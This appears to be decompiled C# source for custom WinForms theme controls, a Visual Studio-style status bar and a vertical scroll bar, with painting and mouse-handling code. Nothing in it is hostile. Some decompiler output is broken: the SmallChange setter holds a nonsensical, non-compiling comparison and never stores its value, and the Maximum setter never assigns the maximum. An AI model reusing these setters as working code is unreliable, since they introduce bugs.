		public VisualStudioStatusBar.Alignments SecondLabelAlignment
		{
			get
			{
				return this._SecondLabelAlignment;
			}
			set
			{
				switch (value)
				{
				case VisualStudioStatusBar.Alignments.Left:
					this._SecondLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Near,
						LineAlignment = StringAlignment.Center
					};
					this._SecondLabelAlignment = value;
					break;
				case VisualStudioStatusBar.Alignments.Center:
					this._SecondLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					};
					this._SecondLabelAlignment = value;
					break;
				case VisualStudioStatusBar.Alignments.Right:
					this._SecondLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Far,
						LineAlignment = StringAlignment.Center
					};
					this._SecondLabelAlignment = value;
					break;
				}
			}
		}

		[Category("Third Label Options")]
		public string ThirdLabelText
		{
			get
			{
				return this._ThirdLabelText;
			}
			set
			{
				this._ThirdLabelText = value;
			}
		}

		[Category("Third Label Options")]
		public VisualStudioStatusBar.Alignments ThirdLabelAlignment
		{
			get
			{
				return this._ThirdLabelAlignment;
			}
			set
			{
				switch (value)
				{
				case VisualStudioStatusBar.Alignments.Left:
					this._ThirdLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Near,
						LineAlignment = StringAlignment.Center
					};
					this._ThirdLabelAlignment = value;
					break;
				case VisualStudioStatusBar.Alignments.Center:
					this._ThirdLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					};
					this._ThirdLabelAlignment = value;
					break;
				case VisualStudioStatusBar.Alignments.Right:
					this._ThirdLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Far,
						LineAlignment = StringAlignment.Center
					};
					this._ThirdLabelAlignment = value;
					break;
				}
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Control")]
		public VisualStudioStatusBar.AmountOfStrings AmountOfString
		{
			get
			{
				return this._NumberOfStrings;
			}
			set
			{
				this._NumberOfStrings = value;
			}
		}

		[Category("Control")]
		public VisualStudioStatusBar.LinesCount LinesToShow
		{
			get
			{
				return this._LinesToShow;
			}
			set
			{
				this._LinesToShow = value;
			}
		}

		public bool ShowBorder
		{
			get
			{
				return this._ShowBorder;
			}
			set
			{
				this._ShowBorder = value;
			}
		}

		[Category("Colours")]
		public Color RectangleColor
		{
			get
			{
				return this._RectColour;
			}
			set
			{
				this._RectColour = value;
			}
		}

		public bool ShowLine
		{
			get
			{
				return this._ShowLine;
			}
			set
			{
				this._ShowLine = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioStatusBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioStatusBar.__ENCList.Count == VisualStudioStatusBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioStatusBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioStatusBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioStatusBar.__ENCList[num] = VisualStudioStatusBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioStatusBar.__ENCList.RemoveRange(num, VisualStudioStatusBar.__ENCList.Count - num);
						VisualStudioStatusBar.__ENCList.Capacity = VisualStudioStatusBar.__ENCList.Count;
					}
					VisualStudioStatusBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void CreateHandle()
		{
			base.CreateHandle();
			this.Dock = DockStyle.Bottom;
		}

		public VisualStudioStatusBar()
		{
			VisualStudioStatusBar.__ENCAddToList(this);
			this._TextColour = Color.FromArgb(153, 153, 153);
			this._BaseColour = Color.FromArgb(45, 45, 48);
			this._RectColour = Color.FromArgb(0, 122, 204);
			this._BorderColour = Color.FromArgb(27, 27, 29);
			this._SeperatorColour = Color.FromArgb(45, 45, 48);
			this._ShowLine = true;
			this._LinesToShow = VisualStudioStatusBar.LinesCount.One;
			this._NumberOfStrings = VisualStudioStatusBar.AmountOfStrings.One;
			this._ShowBorder = true;
			this._FirstLabelText = "Label1";
			this._FirstLabelAlignment = VisualStudioStatusBar.Alignments.Left;
			this._SecondLabelText = "Label2";
			this._SecondLabelAlignment = VisualStudioStatusBar.Alignments.Center;
			this._ThirdLabelText = "Label3";
			this._ThirdLabelAlignment = VisualStudioStatusBar.Alignments.Center;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.Font = new Font("Segoe UI", 9f);
			Size size = new Size(this.Width, 20);
			this.Size = size;
			this.Cursor = Cursors.Arrow;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.FillRectangle(new SolidBrush(this.BaseColour), rect);
			checked
			{
				bool flag;
				switch (this._LinesToShow)
				{
				case VisualStudioStatusBar.LinesCount.None:
					flag = (this._NumberOfStrings == VisualStudioStatusBar.AmountOfStrings.One);
					if (flag)
					{
						Graphics arg_B9_0 = graphics2;
						string arg_B9_1 = this._FirstLabelText;
						Font arg_B9_2 = this.Font;
						Brush arg_B9_3 = new SolidBrush(this._TextColour);
						Rectangle rectangle = new Rectangle(5, 1, this.Width - 5, this.Height);
						arg_B9_0.DrawString(arg_B9_1, arg_B9_2, arg_B9_3, rectangle, this._FirstLabelStringFormat);
					}
					else
					{
						flag = (this._NumberOfStrings == VisualStudioStatusBar.AmountOfStrings.Two);
						if (flag)
						{
							Graphics arg_12C_0 = graphics2;
							string arg_12C_1 = this._FirstLabelText;
							Font arg_12C_2 = this.Font;
							Brush arg_12C_3 = new SolidBrush(this._TextColour);
							Rectangle rectangle = new Rectangle(5, 1, (int)Math.Round(unchecked((double)this.Width / 2.0 - 6.0)), this.Height);
							arg_12C_0.DrawString(arg_12C_1, arg_12C_2, arg_12C_3, rectangle, this._FirstLabelStringFormat);
							Graphics arg_1B0_0 = graphics2;
							string arg_1B0_1 = this._SecondLabelText;
							Font arg_1B0_2 = this.Font;
							Brush arg_1B0_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width - ((double)this.Width / 2.0 + 5.0))), 1, (int)Math.Round(unchecked((double)this.Width / 2.0 - 4.0)), this.Height);
							arg_1B0_0.DrawString(arg_1B0_1, arg_1B0_2, arg_1B0_3, rectangle, this._SecondLabelStringFormat);
							Graphics arg_212_0 = graphics2;
							Pen arg_212_1 = new Pen(this._SeperatorColour, 1f);
							Point point = new Point((int)Math.Round((double)this.Width / 2.0), 6);
							Point arg_212_2 = point;
							Point point2 = new Point((int)Math.Round((double)this.Width / 2.0), this.Height - 6);
							arg_212_0.DrawLine(arg_212_1, arg_212_2, point2);
						}
						else
						{
							Graphics arg_286_0 = graphics2;
							string arg_286_1 = this._FirstLabelText;
							Font arg_286_2 = this.Font;
							Brush arg_286_3 = new SolidBrush(this._TextColour);
							Rectangle rectangle = new Rectangle(5, 1, (int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0 - 6.0)), this.Height);
							arg_286_0.DrawString(arg_286_1, arg_286_2, arg_286_3, rectangle, this._FirstLabelStringFormat);
							Graphics arg_326_0 = graphics2;
							string arg_326_1 = this._SecondLabelText;
							Font arg_326_2 = this.Font;
							Brush arg_326_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0 + 5.0)), 1, (int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0 - 6.0)), this.Height);
							arg_326_0.DrawString(arg_326_1, arg_326_2, arg_326_3, rectangle, this._SecondLabelStringFormat);
							Graphics arg_3AA_0 = graphics2;
							string arg_3AA_1 = this._ThirdLabelText;
							Font arg_3AA_2 = this.Font;
							Brush arg_3AA_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 + 5.0)), 1, (int)Math.Round(unchecked((double)this.Width / 3.0 - 6.0)), this.Height);
							arg_3AA_0.DrawString(arg_3AA_1, arg_3AA_2, arg_3AA_3, rectangle, this._ThirdLabelStringFormat);
							Graphics arg_430_0 = graphics2;
							Pen arg_430_1 = new Pen(this._SeperatorColour, 1f);
							Point point2 = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0)), 6);
							Point arg_430_2 = point2;
							Point point = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0)), this.Height - 6);
							arg_430_0.DrawLine(arg_430_1, arg_430_2, point);
							Graphics arg_4A2_0 = graphics2;
							Pen arg_4A2_1 = new Pen(this._SeperatorColour, 1f);
							point2 = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0)), 6);
							Point arg_4A2_2 = point2;
							point = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0)), this.Height - 6);
							arg_4A2_0.DrawLine(arg_4A2_1, arg_4A2_2, point);
						}
					}
					break;
				case VisualStudioStatusBar.LinesCount.One:
				{
					flag = (this._NumberOfStrings == VisualStudioStatusBar.AmountOfStrings.One);
					Rectangle rectangle;
					if (flag)
					{
						Graphics arg_4FA_0 = graphics2;
						string arg_4FA_1 = this._FirstLabelText;
						Font arg_4FA_2 = this.Font;
						Brush arg_4FA_3 = new SolidBrush(this._TextColour);
						rectangle = new Rectangle(22, 1, this.Width, this.Height);
						arg_4FA_0.DrawString(arg_4FA_1, arg_4FA_2, arg_4FA_3, rectangle, this._FirstLabelStringFormat);
					}
					else
					{
						flag = (this._NumberOfStrings == VisualStudioStatusBar.AmountOfStrings.Two);
						if (flag)
						{
							Graphics arg_56E_0 = graphics2;
							string arg_56E_1 = this._FirstLabelText;
							Font arg_56E_2 = this.Font;
							Brush arg_56E_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle(22, 1, (int)Math.Round(unchecked((double)this.Width / 2.0 - 24.0)), this.Height);
							arg_56E_0.DrawString(arg_56E_1, arg_56E_2, arg_56E_3, rectangle, this._FirstLabelStringFormat);
							Graphics arg_5EA_0 = graphics2;
							string arg_5EA_1 = this._SecondLabelText;
							Font arg_5EA_2 = this.Font;
							Brush arg_5EA_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width / 2.0 + 5.0)), 1, (int)Math.Round(unchecked((double)this.Width / 2.0 - 10.0)), this.Height);
							arg_5EA_0.DrawString(arg_5EA_1, arg_5EA_2, arg_5EA_3, rectangle, this._SecondLabelStringFormat);
							Graphics arg_64C_0 = graphics2;
							Pen arg_64C_1 = new Pen(this._SeperatorColour, 1f);
							Point point2 = new Point((int)Math.Round((double)this.Width / 2.0), 6);
							Point arg_64C_2 = point2;
							Point point = new Point((int)Math.Round((double)this.Width / 2.0), this.Height - 6);
							arg_64C_0.DrawLine(arg_64C_1, arg_64C_2, point);
						}
						else
						{
							Graphics arg_6A8_0 = graphics2;
							string arg_6A8_1 = this._FirstLabelText;
							Font arg_6A8_2 = this.Font;
							Brush arg_6A8_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle(22, 1, (int)Math.Round((double)(this.Width - 78) / 3.0), this.Height);
							arg_6A8_0.DrawString(arg_6A8_1, arg_6A8_2, arg_6A8_3, rectangle, this._FirstLabelStringFormat);
							Graphics arg_748_0 = graphics2;
							string arg_748_1 = this._SecondLabelText;
							Font arg_748_2 = this.Font;
							Brush arg_748_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0 + 5.0)), 1, (int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0 - 12.0)), this.Height);
							arg_748_0.DrawString(arg_748_1, arg_748_2, arg_748_3, rectangle, this._SecondLabelStringFormat);
							Graphics arg_7CC_0 = graphics2;
							string arg_7CC_1 = this._ThirdLabelText;
							Font arg_7CC_2 = this.Font;
							Brush arg_7CC_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 + 6.0)), 1, (int)Math.Round(unchecked((double)this.Width / 3.0 - 22.0)), this.Height);
							arg_7CC_0.DrawString(arg_7CC_1, arg_7CC_2, arg_7CC_3, rectangle, this._ThirdLabelStringFormat);
							Graphics arg_852_0 = graphics2;
							Pen arg_852_1 = new Pen(this._SeperatorColour, 1f);
							Point point2 = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0)), 6);
							Point arg_852_2 = point2;
							Point point = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0)), this.Height - 6);
							arg_852_0.DrawLine(arg_852_1, arg_852_2, point);
							Graphics arg_8C4_0 = graphics2;
							Pen arg_8C4_1 = new Pen(this._SeperatorColour, 1f);
							point2 = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0)), 6);
							Point arg_8C4_2 = point2;
							point = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0)), this.Height - 6);
							arg_8C4_0.DrawLine(arg_8C4_1, arg_8C4_2, point);
						}
					}
					Graphics arg_8E7_0 = graphics2;
					Brush arg_8E7_1 = new SolidBrush(this._RectColour);
					rectangle = new Rectangle(5, 10, 14, 3);
					arg_8E7_0.FillRectangle(arg_8E7_1, rectangle);
					break;
				}
				case VisualStudioStatusBar.LinesCount.Two:
				{
					flag = (this._NumberOfStrings == VisualStudioStatusBar.AmountOfStrings.One);
					Rectangle rectangle;
					if (flag)
					{
						Graphics arg_941_0 = graphics2;
						string arg_941_1 = this._FirstLabelText;
						Font arg_941_2 = this.Font;
						Brush arg_941_3 = new SolidBrush(this._TextColour);
						rectangle = new Rectangle(22, 1, this.Width - 44, this.Height);
						arg_941_0.DrawString(arg_941_1, arg_941_2, arg_941_3, rectangle, this._FirstLabelStringFormat);
					}
					else
					{
						flag = (this._NumberOfStrings == VisualStudioStatusBar.AmountOfStrings.Two);
						if (flag)
						{
							Graphics arg_9AE_0 = graphics2;
							string arg_9AE_1 = this._FirstLabelText;
							Font arg_9AE_2 = this.Font;
							Brush arg_9AE_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle(22, 1, (int)Math.Round((double)(this.Width - 46) / 2.0), this.Height);
							arg_9AE_0.DrawString(arg_9AE_1, arg_9AE_2, arg_9AE_3, rectangle, this._FirstLabelStringFormat);
							Graphics arg_A2A_0 = graphics2;
							string arg_A2A_1 = this._SecondLabelText;
							Font arg_A2A_2 = this.Font;
							Brush arg_A2A_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width / 2.0 + 5.0)), 1, (int)Math.Round(unchecked((double)this.Width / 2.0 - 28.0)), this.Height);
							arg_A2A_0.DrawString(arg_A2A_1, arg_A2A_2, arg_A2A_3, rectangle, this._SecondLabelStringFormat);
							Graphics arg_A8C_0 = graphics2;
							Pen arg_A8C_1 = new Pen(this._SeperatorColour, 1f);
							Point point2 = new Point((int)Math.Round((double)this.Width / 2.0), 6);
							Point arg_A8C_2 = point2;
							Point point = new Point((int)Math.Round((double)this.Width / 2.0), this.Height - 6);
							arg_A8C_0.DrawLine(arg_A8C_1, arg_A8C_2, point);
						}
						else
						{
							Graphics arg_AE8_0 = graphics2;
							string arg_AE8_1 = this._FirstLabelText;
							Font arg_AE8_2 = this.Font;
							Brush arg_AE8_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle(22, 1, (int)Math.Round((double)(this.Width - 78) / 3.0), this.Height);
							arg_AE8_0.DrawString(arg_AE8_1, arg_AE8_2, arg_AE8_3, rectangle, this._FirstLabelStringFormat);
							Graphics arg_B88_0 = graphics2;
							string arg_B88_1 = this._SecondLabelText;
							Font arg_B88_2 = this.Font;
							Brush arg_B88_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0 + 5.0)), 1, (int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0 - 12.0)), this.Height);
							arg_B88_0.DrawString(arg_B88_1, arg_B88_2, arg_B88_3, rectangle, this._SecondLabelStringFormat);
							Graphics arg_C0C_0 = graphics2;
							string arg_C0C_1 = this._ThirdLabelText;
							Font arg_C0C_2 = this.Font;
							Brush arg_C0C_3 = new SolidBrush(this._TextColour);
							rectangle = new Rectangle((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 + 6.0)), 1, (int)Math.Round(unchecked((double)this.Width / 3.0 - 22.0)), this.Height);
							arg_C0C_0.DrawString(arg_C0C_1, arg_C0C_2, arg_C0C_3, rectangle, this._ThirdLabelStringFormat);
							Graphics arg_C92_0 = graphics2;
							Pen arg_C92_1 = new Pen(this._SeperatorColour, 1f);
							Point point2 = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0)), 6);
							Point arg_C92_2 = point2;
							Point point = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0 * 2.0)), this.Height - 6);
							arg_C92_0.DrawLine(arg_C92_1, arg_C92_2, point);
							Graphics arg_D04_0 = graphics2;
							Pen arg_D04_1 = new Pen(this._SeperatorColour, 1f);
							point2 = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0)), 6);
							Point arg_D04_2 = point2;
							point = new Point((int)Math.Round(unchecked((double)this.Width - (double)this.Width / 3.0)), this.Height - 6);
							arg_D04_0.DrawLine(arg_D04_1, arg_D04_2, point);
						}
					}
					Graphics arg_D27_0 = graphics2;
					Brush arg_D27_1 = new SolidBrush(this._SeperatorColour);
					rectangle = new Rectangle(5, 10, 14, 3);
					arg_D27_0.FillRectangle(arg_D27_1, rectangle);
					Graphics arg_D51_0 = graphics2;
					Brush arg_D51_1 = new SolidBrush(this._SeperatorColour);
					rectangle = new Rectangle(this.Width - 20, 10, 14, 3);
					arg_D51_0.FillRectangle(arg_D51_1, rectangle);
					break;
				}
				}
				flag = this._ShowBorder;
				if (flag)
				{
					Graphics arg_D8D_0 = graphics2;
					Pen arg_D8D_1 = new Pen(this._BorderColour, 2f);
					Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
					arg_D8D_0.DrawRectangle(arg_D8D_1, rectangle);
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("Scroll")]
	public class VisualStudioVerticalScrollBar : Control
	{
		public enum __InnerLineCount
		{
			None,
			One,
			Two,
			Three
		}

		public delegate void ScrollEventHandler(object sender);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _BaseColour;

		private Color _ThumbNormalColour;

		private Color _ThumbHoverColour;

		private Color _ThumbPressedColour;

		private Color _ArrowNormalColour;

		private Color _ArrowHoveerColour;

		private Color _ArrowPressedColour;

		private Color _OuterBorderColour;

		private Color _ThumbBorderColour;

		public int _Minimum;

		public int _Maximum;

		private int _Value;

		public int _SmallChange;

		private int _ButtonSize;

		public int _LargeChange;

		private bool _ShowOuterBorder;

		private bool _ShowThumbBorder;

		private VisualStudioVerticalScrollBar.__InnerLineCount _AmountOfInnerLines;

		private Point _MousePos;

		private MouseState _ThumbState;

		private MouseState _ArrowState;

		private int _MouseXLoc;

		private int _MouseYLoc;

		private int ThumbMovement;

		private Rectangle TSA;

		private Rectangle BSA;

		private Rectangle Shaft;

		private Rectangle Thumb;

		private bool ShowThumb;

		private bool ThumbPressed;

		private int _ThumbSize;

		private VisualStudioVerticalScrollBar.ScrollEventHandler ScrollEvent;

		public event VisualStudioVerticalScrollBar.ScrollEventHandler Scroll
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.ScrollEvent = (VisualStudioVerticalScrollBar.ScrollEventHandler)Delegate.Combine(this.ScrollEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.ScrollEvent = (VisualStudioVerticalScrollBar.ScrollEventHandler)Delegate.Remove(this.ScrollEvent, value);
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbNormalColour
		{
			get
			{
				return this._ThumbNormalColour;
			}
			set
			{
				this._ThumbNormalColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbHoverColour
		{
			get
			{
				return this._ThumbHoverColour;
			}
			set
			{
				this._ThumbHoverColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbPressedColour
		{
			get
			{
				return this._ThumbPressedColour;
			}
			set
			{
				this._ThumbPressedColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowNormalColour
		{
			get
			{
				return this._ArrowNormalColour;
			}
			set
			{
				this._ArrowNormalColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowHoveerColour
		{
			get
			{
				return this._ArrowHoveerColour;
			}
			set
			{
				this._ArrowHoveerColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowPressedColour
		{
			get
			{
				return this._ArrowPressedColour;
			}
			set
			{
				this._ArrowPressedColour = value;
			}
		}

		[Category("Colours")]
		public Color OuterBorderColour
		{
			get
			{
				return this._OuterBorderColour;
			}
			set
			{
				this._OuterBorderColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbBorderColour
		{
			get
			{
				return this._ThumbBorderColour;
			}
			set
			{
				this._ThumbBorderColour = value;
			}
		}

		[Category("Control")]
		public int Minimum
		{
			get
			{
				return this._Minimum;
			}
			set
			{
				this._Minimum = value;
				bool flag = value > this._Value;
				if (flag)
				{
					this._Value = value;
				}
				flag = (value > this._Maximum);
				if (flag)
				{
					this._Maximum = value;
				}
				this.InvalidateLayout();
			}
		}

		[Category("Control")]
		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value < this._Value;
				if (flag)
				{
					this._Value = value;
				}
				flag = (value < this._Minimum);
				if (flag)
				{
					this._Minimum = value;
				}
				this.InvalidateLayout();
			}
		}

		[Category("Control")]
		public int Value
		{
			get
			{
				return this._Value;
			}
			set
			{
				bool flag = value == this._Value;
				if (!flag)
				{
					flag = (value < this._Minimum);
					if (flag)
					{
						this._Value = this._Minimum;
					}
					else
					{
						flag = (value > this._Maximum);
						if (flag)
						{
							this._Value = this._Maximum;
						}
						else
						{
							this._Value = value;
						}
					}
					this.InvalidatePosition();
					VisualStudioVerticalScrollBar.ScrollEventHandler scrollEvent = this.ScrollEvent;
					flag = (scrollEvent != null);
					if (flag)
					{
						scrollEvent(this);
					}
				}
			}
		}

		[Category("Control")]
		public int SmallChange
		{
			get
			{
				return this._SmallChange;
			}
			set
			{
				bool flag = value < 1;
				if (!flag)
				{
					flag = (value > ((-(((this._SmallChange == value) > false) ? 1 : 0)) ? 1 : 0));
					if (flag)
					{
					}
				}
			}
		}

		[Category("Control")]
		public int LargeChange
		{
			get
			{
				return this._LargeChange;
			}
			set
			{
				bool flag = value < 1;
				if (!flag)
				{
					this._LargeChange = value;
				}
			}
		}

		[Category("Control")]
		public int ButtonSize
		{
			get
			{
				return this._ButtonSize;
			}
			set
			{
				bool flag = value < 16;
				if (flag)
				{
					this._ButtonSize = 16;
				}
				else
				{
					this._ButtonSize = value;
				}
			}
		}

		[Category("Control")]
		public bool ShowOuterBorder
		{
			get
			{
				return this._ShowOuterBorder;
			}
			set
			{
				this._ShowOuterBorder = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool ShowThumbBorder
		{
			get
			{
				return this._ShowThumbBorder;
			}
			set
			{
				this._ShowThumbBorder = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public VisualStudioVerticalScrollBar.__InnerLineCount AmountOfInnerLines
		{
			get
			{
				return this._AmountOfInnerLines;
			}
			set
			{
				this._AmountOfInnerLines = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioVerticalScrollBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioVerticalScrollBar.__ENCList.Count == VisualStudioVerticalScrollBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioVerticalScrollBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioVerticalScrollBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioVerticalScrollBar.__ENCList[num] = VisualStudioVerticalScrollBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioVerticalScrollBar.__ENCList.RemoveRange(num, VisualStudioVerticalScrollBar.__ENCList.Count - num);
						VisualStudioVerticalScrollBar.__ENCList.Capacity = VisualStudioVerticalScrollBar.__ENCList.Count;
					}
					VisualStudioVerticalScrollBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			this.InvalidateLayout();
		}

		private void InvalidateLayout()
		{
			this.TSA = new Rectangle(0, 0, this.Width, 16);
			checked
			{
				this.BSA = new Rectangle(0, this.Height - this.ButtonSize, this.Width, this.ButtonSize);
				this.Shaft = new Rectangle(0, this.TSA.Bottom + 1, this.Width, (int)Math.Round(unchecked((double)this.Height - (double)this.Height / 8.0 - 8.0)));
				this.ShowThumb = (this._Maximum - this._Minimum != 0);
				bool flag = this.ShowThumb;
				if (flag)
				{
					this.Thumb = new Rectangle(4, 0, this.Width - 8, (int)Math.Round((double)this.Height / 8.0));
				}
				VisualStudioVerticalScrollBar.ScrollEventHandler scrollEvent = this.ScrollEvent;
				flag = (scrollEvent != null);
				if (flag)
				{
					scrollEvent(this);
				}
				this.InvalidatePosition();
			}
		}

		public void InvalidatePosition()
		{
			this.Thumb.Y = checked((int)Math.Round(unchecked(checked((double)(this._Value - this._Minimum) / (double)(this._Maximum - this._Minimum)) * (double)(checked(this.Shaft.Height - this._ThumbSize)) + 16.0)));
			this.Invalidate();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left && this.ShowThumb;
			checked
			{
				if (flag)
				{
					bool flag2 = this.TSA.Contains(e.Location);
					if (flag2)
					{
						this._ArrowState = MouseState.Down;
						this.ThumbMovement = this._Value - this._SmallChange;
					}
					else
					{
						flag2 = this.BSA.Contains(e.Location);
						if (flag2)
						{
							this.ThumbMovement = this._Value + this._SmallChange;
							this._ArrowState = MouseState.Down;
						}
						else
						{
							flag2 = this.Thumb.Contains(e.Location);
							if (flag2)
							{
								this._ThumbState = MouseState.Down;
								this.Invalidate();
								return;
							}
							flag2 = (e.Y < this.Thumb.Y);
							if (flag2)
							{
								this.ThumbMovement = this._Value - this._LargeChange;
							}
							else
							{
								this.ThumbMovement = this._Value + this._LargeChange;
							}
						}
					}
					this.Value = Math.Min(Math.Max(this.ThumbMovement, this._Minimum), this._Maximum);
					this.Invalidate();
					this.InvalidatePosition();
				}
			}
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			this._MouseXLoc = e.Location.X;
			this._MouseYLoc = e.Location.Y;
			bool flag = this.TSA.Contains(e.Location);
			if (flag)
			{
				this._ArrowState = MouseState.Over;
			}
			else
			{
				flag = this.BSA.Contains(e.Location);
				if (flag)
				{
					this._ArrowState = MouseState.Over;
				}
				else
				{
					flag = (this._ArrowState != MouseState.Down);
					if (flag)
					{
						this._ArrowState = MouseState.None;
					}
				}
			}
			flag = (this.Thumb.Contains(e.Location) & this._ThumbState != MouseState.Down);
			if (flag)
			{
				this._ThumbState = MouseState.Over;
			}
			else
			{
				flag = (this._ThumbState != MouseState.Down);
				if (flag)
				{
					this._ThumbState = MouseState.None;
				}
			}
			this.Invalidate();
			flag = (this._ThumbState == MouseState.Down | (this._ArrowState == MouseState.Down && this.ShowThumb));
			checked
			{
				if (flag)
				{
					int num = e.Y + 2 - this.TSA.Height - this._ThumbSize / 2;
					int num2 = this.Shaft.Height - this._ThumbSize;
					this.ThumbMovement = (int)Math.Round(unchecked((double)num / (double)num2 * (double)(checked(this._Maximum - this._Minimum)))) - this._Minimum;
					this.Value = Math.Min(Math.Max(this.ThumbMovement, this._Minimum), this._Maximum);
					this.InvalidatePosition();
				}
			}
		}

